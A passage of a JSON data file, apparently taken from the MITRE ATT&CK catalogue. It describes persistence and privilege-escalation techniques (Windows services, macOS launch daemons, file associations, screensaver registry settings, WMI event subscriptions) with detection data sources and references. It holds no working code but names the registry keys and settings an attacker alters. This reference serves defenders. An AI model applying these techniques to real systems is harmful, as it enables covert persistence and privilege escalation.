        "url": "https://technet.microsoft.com/en-us/library/cc772408.aspx",
        "description": "Microsoft. (n.d.). Services. Retrieved June 7, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Autoruns",
        "url": "https://technet.microsoft.com/en-us/sysinternals/bb963902",
        "description": "Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft 4697 APR 2017",
        "url": "https://docs.microsoft.com/windows/security/threat-protection/auditing/event-4697",
        "description": "Miroshnikov, A. & Hall, J. (2017, April 18). 4697(S): A service was installed in the system. Retrieved August 7, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Windows Event Forwarding FEB 2018",
        "url": "https://docs.microsoft.com/windows/security/threat-protection/use-windows-event-forwarding-to-assist-in-intrusion-detection",
        "description": "Hardy, T. & Hall, J. (2018, February 15). Use Windows Event Forwarding to help with intrusion detection. Retrieved August 7, 2018.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32",
    "platform": "windows",
    "tid": "T1543.003",
    "technique": "Windows Service",
    "tactic": "privilege-escalation",
    "datasources": "api-monitoring|file-monitoring|process-command-line-parameters|process-monitoring|windows-event-logs|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service’s executable or recovery programs/commands, is stored in the Windows Registry. Service configurations can be modified using utilities such as sc.exe and <a href=\"https://attack.mitre.org/software/S0075\">Reg</a>. <!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may install a new service or modify an existing service by using system utilities to interact with services, by directly modifying the Registry, or by using custom tools to interact with the Windows API. Adversaries may configure services to execute at startup in order to persist on a system.<!-- raw HTML omitted --><!-- raw HTML omitted -->An adversary may also incorporate <a href=\"https://attack.mitre.org/techniques/T1036\">Masquerading</a> by using a service name from a related operating system or benign software, or by modifying existing services to make detection analysis more challenging. Modifying existing services may interrupt their functionality or may enable services that are disabled or otherwise not commonly used. <!-- raw HTML omitted --><!-- raw HTML omitted -->Services may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges from administrator to SYSTEM. Adversaries may also directly start services through <a href=\"https://attack.mitre.org/techniques/T1569/002\">Service Execution</a>.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/478.html",
        "description": "none",
        "external_id": "CAPEC-478"
      },
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/550.html",
        "description": "none",
        "external_id": "CAPEC-550"
      },
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/551.html",
        "description": "none",
        "external_id": "CAPEC-551"
      },
      {
        "source_name": "TechNet Services",
        "url": "https://technet.microsoft.com/en-us/library/cc772408.aspx",
        "description": "Microsoft. (n.d.). Services. Retrieved June 7, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Autoruns",
        "url": "https://technet.microsoft.com/en-us/sysinternals/bb963902",
        "description": "Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft 4697 APR 2017",
        "url": "https://docs.microsoft.com/windows/security/threat-protection/auditing/event-4697",
        "description": "Miroshnikov, A. & Hall, J. (2017, April 18). 4697(S): A service was installed in the system. Retrieved August 7, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Windows Event Forwarding FEB 2018",
        "url": "https://docs.microsoft.com/windows/security/threat-protection/use-windows-event-forwarding-to-assist-in-intrusion-detection",
        "description": "Hardy, T. & Hall, J. (2018, February 15). Use Windows Event Forwarding to help with intrusion detection. Retrieved August 7, 2018.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--573ad264-1371-4ae0-8482-d2673b719dba",
    "platform": "macos",
    "tid": "T1543.004",
    "technique": "Launch Daemon",
    "tactic": "persistence",
    "datasources": "file-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may create or modify launch daemons to repeatedly execute malicious payloads as part of persistence. Per Apple’s developer documentation, when macOS and OS X boot up, launchd is run to finish system initialization. This process loads the parameters for each launch-on-demand system-level daemon from the property list (plist) files found in <!-- raw HTML omitted -->/System/Library/LaunchDaemons<!-- raw HTML omitted --> and <!-- raw HTML omitted -->/Library/LaunchDaemons<!-- raw HTML omitted --> (Citation: AppleDocs Launch Agent Daemons). These LaunchDaemons have property list files which point to the executables that will be launched (Citation: Methods of Mac Malware Persistence). <!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may install a new launch daemon that can be configured to execute at startup by using launchd or launchctl to load a plist into the appropriate directories  (Citation: OSX Malware Detection). The daemon name may be disguised by using a name from a related operating system or benign software (Citation: WireLurker). Launch Daemons may be created with administrator privileges, but are executed under root privileges, so an adversary may also use a service to escalate privileges from administrator to root. <!-- raw HTML omitted --><!-- raw HTML omitted -->The plist file permissions must be root:wheel, but the script or program that it points to has no such requirement. So, it is possible for poor configurations to allow an adversary to modify a current Launch Daemon’s executable and gain persistence or Privilege Escalation.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/550.html",
        "description": "none",
        "external_id": "CAPEC-550"
      },
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/551.html",
        "description": "none",
        "external_id": "CAPEC-551"
      },
      {
        "source_name": "AppleDocs Launch Agent Daemons",
        "url": "https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html",
        "description": "Apple. (n.d.). Creating Launch Daemons and Agents. Retrieved July 10, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Methods of Mac Malware Persistence",
        "url": "https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf",
        "description": "Patrick Wardle. (2014, September). Methods of Malware Persistence on Mac OS X. Retrieved July 5, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "OSX Malware Detection",
        "url": "https://www.synack.com/wp-content/uploads/2016/03/RSA_OSX_Malware.pdf",
        "description": "Patrick Wardle. (2016, February 29). Let's Play Doctor: Practical OS X Malware Detection & Analysis. Retrieved July 10, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "WireLurker",
        "url": "https://www.paloaltonetworks.com/content/dam/pan/en_US/assets/pdf/reports/Unit_42/unit42-wirelurker.pdf",
        "description": "Claud Xiao. (n.d.). WireLurker: A New Era in iOS and OS X Malware. Retrieved July 10, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--573ad264-1371-4ae0-8482-d2673b719dba",
    "platform": "macos",
    "tid": "T1543.004",
    "technique": "Launch Daemon",
    "tactic": "privilege-escalation",
    "datasources": "file-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may create or modify launch daemons to repeatedly execute malicious payloads as part of persistence. Per Apple’s developer documentation, when macOS and OS X boot up, launchd is run to finish system initialization. This process loads the parameters for each launch-on-demand system-level daemon from the property list (plist) files found in <!-- raw HTML omitted -->/System/Library/LaunchDaemons<!-- raw HTML omitted --> and <!-- raw HTML omitted -->/Library/LaunchDaemons<!-- raw HTML omitted --> (Citation: AppleDocs Launch Agent Daemons). These LaunchDaemons have property list files which point to the executables that will be launched (Citation: Methods of Mac Malware Persistence). <!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may install a new launch daemon that can be configured to execute at startup by using launchd or launchctl to load a plist into the appropriate directories  (Citation: OSX Malware Detection). The daemon name may be disguised by using a name from a related operating system or benign software (Citation: WireLurker). Launch Daemons may be created with administrator privileges, but are executed under root privileges, so an adversary may also use a service to escalate privileges from administrator to root. <!-- raw HTML omitted --><!-- raw HTML omitted -->The plist file permissions must be root:wheel, but the script or program that it points to has no such requirement. So, it is possible for poor configurations to allow an adversary to modify a current Launch Daemon’s executable and gain persistence or Privilege Escalation.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/550.html",
        "description": "none",
        "external_id": "CAPEC-550"
      },
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/551.html",
        "description": "none",
        "external_id": "CAPEC-551"
      },
      {
        "source_name": "AppleDocs Launch Agent Daemons",
        "url": "https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html",
        "description": "Apple. (n.d.). Creating Launch Daemons and Agents. Retrieved July 10, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Methods of Mac Malware Persistence",
        "url": "https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf",
        "description": "Patrick Wardle. (2014, September). Methods of Malware Persistence on Mac OS X. Retrieved July 5, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "OSX Malware Detection",
        "url": "https://www.synack.com/wp-content/uploads/2016/03/RSA_OSX_Malware.pdf",
        "description": "Patrick Wardle. (2016, February 29). Let's Play Doctor: Practical OS X Malware Detection & Analysis. Retrieved July 10, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "WireLurker",
        "url": "https://www.paloaltonetworks.com/content/dam/pan/en_US/assets/pdf/reports/Unit_42/unit42-wirelurker.pdf",
        "description": "Claud Xiao. (n.d.). WireLurker: A New Era in iOS and OS X Malware. Retrieved July 10, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--98034fef-d9fb-4667-8dc4-2eab6231724c",
    "platform": "windows",
    "tid": "T1546.001",
    "technique": "Change Default File Association",
    "tactic": "privilege-escalation",
    "datasources": "process-command-line-parameters|process-monitoring|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may establish persistence by executing malicious content triggered by a file type association. When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access (Citation: Microsoft Change Default Programs) (Citation: Microsoft File Handlers) or by administrators using the built-in assoc utility. (Citation: Microsoft Assoc Oct 2017) Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.<!-- raw HTML omitted --><!-- raw HTML omitted -->System file associations are listed under <!-- raw HTML omitted -->HKEY_CLASSES_ROOT.[extension]<!-- raw HTML omitted -->, for example <!-- raw HTML omitted -->HKEY_CLASSES_ROOT.txt<!-- raw HTML omitted -->. The entries point to a handler for that extension located at <!-- raw HTML omitted -->HKEY_CLASSES_ROOT[handler]<!-- raw HTML omitted -->. The various commands are then listed as subkeys underneath the shell key at <!-- raw HTML omitted -->HKEY_CLASSES_ROOT[handler]\\shell[action]\\command<!-- raw HTML omitted -->. For example: <!-- raw HTML omitted -->* <!-- raw HTML omitted -->HKEY_CLASSES_ROOT\\txtfile\\shell\\open\\command<!-- raw HTML omitted --><!-- raw HTML omitted -->* <!-- raw HTML omitted -->HKEY_CLASSES_ROOT\\txtfile\\shell\\print\\command<!-- raw HTML omitted --><!-- raw HTML omitted -->* <!-- raw HTML omitted -->HKEY_CLASSES_ROOT\\txtfile\\shell\\printto\\command<!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->The values of the keys listed are commands that are executed when the handler opens the file extension. Adversaries can modify these values to continually execute arbitrary commands. (Citation: TrendMicro TROJ-FAKEAV OCT 2012)</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/556.html",
        "description": "none",
        "external_id": "CAPEC-556"
      },
      {
        "source_name": "Microsoft Change Default Programs",
        "url": "https://support.microsoft.com/en-us/help/18539/windows-7-change-default-programs",
        "description": "Microsoft. (n.d.). Change which programs Windows 7 uses by default. Retrieved July 26, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft File Handlers",
        "url": "http://msdn.microsoft.com/en-us/library/bb166549.aspx",
        "description": "Microsoft. (n.d.). Specifying File Handlers for File Name Extensions. Retrieved November 13, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Assoc Oct 2017",
        "url": "https://docs.microsoft.com/windows-server/administration/windows-commands/assoc",
        "description": "Plett, C. et al.. (2017, October 15). assoc. Retrieved August 7, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "TrendMicro TROJ-FAKEAV OCT 2012",
        "url": "https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/troj_fakeav.gzd",
        "description": "Sioting, S. (2012, October 8). TROJ_FAKEAV.GZD. Retrieved August 8, 2018.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--98034fef-d9fb-4667-8dc4-2eab6231724c",
    "platform": "windows",
    "tid": "T1546.001",
    "technique": "Change Default File Association",
    "tactic": "persistence",
    "datasources": "process-command-line-parameters|process-monitoring|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may establish persistence by executing malicious content triggered by a file type association. When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access (Citation: Microsoft Change Default Programs) (Citation: Microsoft File Handlers) or by administrators using the built-in assoc utility. (Citation: Microsoft Assoc Oct 2017) Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.<!-- raw HTML omitted --><!-- raw HTML omitted -->System file associations are listed under <!-- raw HTML omitted -->HKEY_CLASSES_ROOT.[extension]<!-- raw HTML omitted -->, for example <!-- raw HTML omitted -->HKEY_CLASSES_ROOT.txt<!-- raw HTML omitted -->. The entries point to a handler for that extension located at <!-- raw HTML omitted -->HKEY_CLASSES_ROOT[handler]<!-- raw HTML omitted -->. The various commands are then listed as subkeys underneath the shell key at <!-- raw HTML omitted -->HKEY_CLASSES_ROOT[handler]\\shell[action]\\command<!-- raw HTML omitted -->. For example: <!-- raw HTML omitted -->* <!-- raw HTML omitted -->HKEY_CLASSES_ROOT\\txtfile\\shell\\open\\command<!-- raw HTML omitted --><!-- raw HTML omitted -->* <!-- raw HTML omitted -->HKEY_CLASSES_ROOT\\txtfile\\shell\\print\\command<!-- raw HTML omitted --><!-- raw HTML omitted -->* <!-- raw HTML omitted -->HKEY_CLASSES_ROOT\\txtfile\\shell\\printto\\command<!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->The values of the keys listed are commands that are executed when the handler opens the file extension. Adversaries can modify these values to continually execute arbitrary commands. (Citation: TrendMicro TROJ-FAKEAV OCT 2012)</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/556.html",
        "description": "none",
        "external_id": "CAPEC-556"
      },
      {
        "source_name": "Microsoft Change Default Programs",
        "url": "https://support.microsoft.com/en-us/help/18539/windows-7-change-default-programs",
        "description": "Microsoft. (n.d.). Change which programs Windows 7 uses by default. Retrieved July 26, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft File Handlers",
        "url": "http://msdn.microsoft.com/en-us/library/bb166549.aspx",
        "description": "Microsoft. (n.d.). Specifying File Handlers for File Name Extensions. Retrieved November 13, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Assoc Oct 2017",
        "url": "https://docs.microsoft.com/windows-server/administration/windows-commands/assoc",
        "description": "Plett, C. et al.. (2017, October 15). assoc. Retrieved August 7, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "TrendMicro TROJ-FAKEAV OCT 2012",
        "url": "https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/troj_fakeav.gzd",
        "description": "Sioting, S. (2012, October 8). TROJ_FAKEAV.GZD. Retrieved August 8, 2018.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--ce4b7013-640e-48a9-b501-d0025a95f4bf",
    "platform": "windows",
    "tid": "T1546.002",
    "technique": "Screensaver",
    "tactic": "privilege-escalation",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may establish persistence by executing malicious content triggered by user inactivity. Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension.(Citation: Wikipedia Screensaver) The Windows screensaver application scrnsave.scr is located in <!-- raw HTML omitted -->C:\\Windows\\System32&lt;/code&gt;, and <!-- raw HTML omitted -->C:\\Windows\\sysWOW64&lt;/code&gt;  on 64-bit Windows systems, along with screensavers included with base Windows installations.<!-- raw HTML omitted --><!-- raw HTML omitted -->The following screensaver settings are stored in the Registry (<!-- raw HTML omitted -->HKCU\\Control Panel\\Desktop&lt;/code&gt;) and could be manipulated to achieve persistence:<!-- raw HTML omitted --><!-- raw HTML omitted -->* <!-- raw HTML omitted -->SCRNSAVE.exe<!-- raw HTML omitted --> - set to malicious PE path<!-- raw HTML omitted -->* <!-- raw HTML omitted -->ScreenSaveActive<!-- raw HTML omitted --> - set to ‘1’ to enable the screensaver<!-- raw HTML omitted -->* <!-- raw HTML omitted -->ScreenSaverIsSecure<!-- raw HTML omitted --> - set to ‘0’ to not require a password to unlock<!-- raw HTML omitted -->* <!-- raw HTML omitted -->ScreenSaveTimeout<!-- raw HTML omitted --> - sets user inactivity timeout before screensaver is executed<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity. (Citation: ESET Gazer Aug 2017)</p>\n",
    "technique_references": [
      {
        "source_name": "Wikipedia Screensaver",
        "url": "https://en.wikipedia.org/wiki/Screensaver",
        "description": "Wikipedia. (2017, November 22). Screensaver. Retrieved December 5, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "ESET Gazer Aug 2017",
        "url": "https://www.welivesecurity.com/wp-content/uploads/2017/08/eset-gazer.pdf",
        "description": "ESET. (2017, August). Gazing at Gazer: Turla’s new second stage backdoor. Retrieved September 14, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--ce4b7013-640e-48a9-b501-d0025a95f4bf",
    "platform": "windows",
    "tid": "T1546.002",
    "technique": "Screensaver",
    "tactic": "persistence",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may establish persistence by executing malicious content triggered by user inactivity. Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension.(Citation: Wikipedia Screensaver) The Windows screensaver application scrnsave.scr is located in <!-- raw HTML omitted -->C:\\Windows\\System32&lt;/code&gt;, and <!-- raw HTML omitted -->C:\\Windows\\sysWOW64&lt;/code&gt;  on 64-bit Windows systems, along with screensavers included with base Windows installations.<!-- raw HTML omitted --><!-- raw HTML omitted -->The following screensaver settings are stored in the Registry (<!-- raw HTML omitted -->HKCU\\Control Panel\\Desktop&lt;/code&gt;) and could be manipulated to achieve persistence:<!-- raw HTML omitted --><!-- raw HTML omitted -->* <!-- raw HTML omitted -->SCRNSAVE.exe<!-- raw HTML omitted --> - set to malicious PE path<!-- raw HTML omitted -->* <!-- raw HTML omitted -->ScreenSaveActive<!-- raw HTML omitted --> - set to ‘1’ to enable the screensaver<!-- raw HTML omitted -->* <!-- raw HTML omitted -->ScreenSaverIsSecure<!-- raw HTML omitted --> - set to ‘0’ to not require a password to unlock<!-- raw HTML omitted -->* <!-- raw HTML omitted -->ScreenSaveTimeout<!-- raw HTML omitted --> - sets user inactivity timeout before screensaver is executed<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity. (Citation: ESET Gazer Aug 2017)</p>\n",
    "technique_references": [
      {
        "source_name": "Wikipedia Screensaver",
        "url": "https://en.wikipedia.org/wiki/Screensaver",
        "description": "Wikipedia. (2017, November 22). Screensaver. Retrieved December 5, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "ESET Gazer Aug 2017",
        "url": "https://www.welivesecurity.com/wp-content/uploads/2017/08/eset-gazer.pdf",
        "description": "ESET. (2017, August). Gazing at Gazer: Turla’s new second stage backdoor. Retrieved September 14, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--910906dd-8c0a-475a-9cc1-5e029e2fad58",
    "platform": "windows",
    "tid": "T1546.003",
    "technique": "Windows Management Instrumentation Event Subscription",
    "tactic": "privilege-escalation",
    "datasources": "process-command-line-parameters|process-monitoring|wmi-objects",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation (WMI) event subscription. WMI can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Examples of events that may be subscribed to are the wall clock time, user loging, or the computer’s uptime. (Citation: Mandiant M-Trends 2015)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system. (Citation: FireEye WMI SANS 2015) (Citation: FireEye WMI 2015) Adversaries may also compile WMI scripts into Windows Management Object (MOF) files (.mof extension) that can be used to create a malicious subscription. (Citation: Dell WMI Persistence) (Citation: Microsoft MOF May 2018)<!-- raw HTML omitted --><!-- raw HTML omitted -->WMI subscription execution is proxied by the WMI Provider Host process (WmiPrvSe.exe) and thus may result in elevated SYSTEM privileges.</p>\n",
    "technique_references": [
      {
        "source_name": "Mandiant M-Trends 2015",
        "url": "https://www2.fireeye.com/rs/fireye/images/rpt-m-trends-2015.pdf",
        "description": "Mandiant. (2015, February 24). M-Trends 2015: A View from the Front Lines. Retrieved May 18, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye WMI SANS 2015",
        "url": "https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/sans-dfir-2015.pdf",
        "description": "Devon Kerr. (2015). There's Something About WMI. Retrieved May 4, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye WMI 2015",
        "url": "https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf",
        "description": "Ballenthin, W., et al. (2015). Windows Management Instrumentation (WMI) Offense, Defense, and Forensics. Retrieved March 30, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Dell WMI Persistence",
        "url": "https://www.secureworks.com/blog/wmi-persistence",
        "description": "Dell SecureWorks Counter Threat Unit™ (CTU) Research Team. (2016, March 28). A Novel WMI Persistence Implementation. Retrieved March 30, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft MOF May 2018",
        "url": "https://docs.microsoft.com/en-us/windows/win32/wmisdk/managed-object-format--mof-",
        "description": "Satran, M. (2018, May 30). Managed Object Format (MOF). Retrieved January 24, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Autoruns",
        "url": "https://technet.microsoft.com/en-us/sysinternals/bb963902",
        "description": "Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Medium Detecting WMI Persistence",
        "url": "https://medium.com/threatpunter/detecting-removing-wmi-persistence-60ccbb7dff96",
        "description": "French, D. (2018, October 9). Detecting & Removing an Attacker’s WMI Persistence. Retrieved October 11, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Register-WmiEvent",
        "url": "https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/register-wmievent?view=powershell-5.1",
        "description": "Microsoft. (n.d.). Retrieved January 24, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--910906dd-8c0a-475a-9cc1-5e029e2fad58",
    "platform": "windows",
    "tid": "T1546.003",
    "technique": "Windows Management Instrumentation Event Subscription",
    "tactic": "persistence",
    "datasources": "process-command-line-parameters|process-monitoring|wmi-objects",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation (WMI) event subscription. WMI can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Examples of events that may be subscribed to are the wall clock time, user loging, or the computer’s uptime. (Citation: Mandiant M-Trends 2015)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system. (Citation: FireEye WMI SANS 2015) (Citation: FireEye WMI 2015) Adversaries may also compile WMI scripts into Windows Management Object (MOF) files (.mof extension) that can be used to create a malicious subscription. (Citation: Dell WMI Persistence) (Citation: Microsoft MOF May 2018)<!-- raw HTML omitted --><!-- raw HTML omitted -->WMI subscription execution is proxied by the WMI Provider Host process (WmiPrvSe.exe) and thus may result in elevated SYSTEM privileges.</p>\n",
    "technique_references": [
      {
        "source_name": "Mandiant M-Trends 2015",
        "url": "https://www2.fireeye.com/rs/fireye/images/rpt-m-trends-2015.pdf",
        "description": "Mandiant. (2015, February 24). M-Trends 2015: A View from the Front Lines. Retrieved May 18, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye WMI SANS 2015",
        "url": "https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/sans-dfir-2015.pdf",
        "description": "Devon Kerr. (2015). There's Something About WMI. Retrieved May 4, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye WMI 2015",
        "url": "https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf",
        "description": "Ballenthin, W., et al. (2015). Windows Management Instrumentation (WMI) Offense, Defense, and Forensics. Retrieved March 30, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Dell WMI Persistence",
        "url": "https://www.secureworks.com/blog/wmi-persistence",
        "description": "Dell SecureWorks Counter Threat Unit™ (CTU) Research Team. (2016, March 28). A Novel WMI Persistence Implementation. Retrieved March 30, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft MOF May 2018",
        "url": "https://docs.microsoft.com/en-us/windows/win32/wmisdk/managed-object-format--mof-",
        "description": "Satran, M. (2018, May 30). Managed Object Format (MOF). Retrieved January 24, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Autoruns",
        "url": "https://technet.microsoft.com/en-us/sysinternals/bb963902",
        "description": "Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Medium Detecting WMI Persistence",
        "url": "https://medium.com/threatpunter/detecting-removing-wmi-persistence-60ccbb7dff96",
        "description": "French, D. (2018, October 9). Detecting & Removing an Attacker’s WMI Persistence. Retrieved October 11, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Register-WmiEvent",
        "url": "https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/register-wmievent?view=powershell-5.1",
        "description": "Microsoft. (n.d.). Retrieved January 24, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--b63a34e8-0a61-4c97-a23b-bf8a2ed812e2",
    "platform": "linux|macos",
    "tid": "T1546.004",
    "technique": ".bash_profile and .bashrc",
    "tactic": "privilege-escalation",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring|process-use-of-network",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
